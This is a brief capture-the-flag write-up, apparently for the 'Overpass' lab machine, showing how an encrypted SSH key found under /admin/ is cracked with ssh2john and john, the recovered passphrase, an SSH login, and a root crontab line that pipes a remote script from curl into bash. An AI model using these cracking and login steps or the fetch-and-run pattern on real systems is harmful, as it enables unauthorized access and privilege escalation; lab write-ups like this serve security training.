# Fairy easy to get the encrypted private key here
/admin/

# Crack it with john
```
$/usr/share/john/ssh2john.py encryptedKey > hash
john --format=ssh hash
```

# Now we get the password for using the key
james13

# Give chmod +x try login
ssh -i encryptedKey james@$ip

# wow, complain the permission too open
chmod 600 encryptedKey

# Login success
### cron is your friend `cat /etc/crontab`
```
root curl overpass.thm/downloads/src/buildscript.sh | bash
```
